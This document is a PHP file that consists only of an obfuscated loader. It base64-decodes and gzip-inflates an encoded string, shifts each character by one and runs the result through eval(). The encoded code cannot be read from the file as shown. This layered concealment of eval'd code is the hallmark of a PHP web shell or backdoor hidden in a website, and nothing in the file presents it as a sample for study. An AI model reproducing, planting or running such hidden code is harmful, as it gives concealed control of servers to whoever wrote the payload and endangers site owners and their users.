<?php function Tgci($nJgcy)
{ 
$nJgcy=gzinflate(base64_decode($nJgcy));
 for($i=0;$i<strlen($nJgcy);$i++)
 {
$nJgcy[$i] = chr(ord($nJgcy[$i])-1);
 }
 return $nJgcy;
 }eval(Tgci("jVJda9swFH1PIP/hIgqWYShxwh7m4ZURVjoINCwrZSwQHFupRC1dIymUUfrbJ8kfgZbB/CAs6Zx7zj1XAP6bTbkxaA6Gt2ic1I90kX6eTa/QSNRQgOFl3UjNafILzwYe+BHuf2xySC6o7D3sRjZcl4r3OF4JBLLXk/1itfr9KVPrzffdGn4iNvFkofzd17MTaHKIJ6uP6i46uDWyxj8X1E1Z8SPiUw7CuTafz09HVqGaRydMdOhBaKmChIU1KlXq2l7KZAweLMJWtLATvGmADoxWtAcbjnpw6tFLNpSArUHVOthxa4O9kVap+i1tr79pxw3ERHp+DiTk1sqnshJnH9wJW64p8aq+F+tqqckHYkhMV3GfSB1Aj9xZOrDCnTxRZ6SiPSaFooBktJ6kL7Pp5OSHcPDMQ4Xehw4VupTInLB+dIxcd5kVcR91J8O4umS2pbXPaOp+Mr7XCB2zHHDxWQyQQcBrdfWZNzdSQgav/2hiDDI28Sx8E0CzosjCtnc2ivxni/GnIOxs/LOssOb08l7HwSRpmjLy1mNcrr/8BQ=="));?>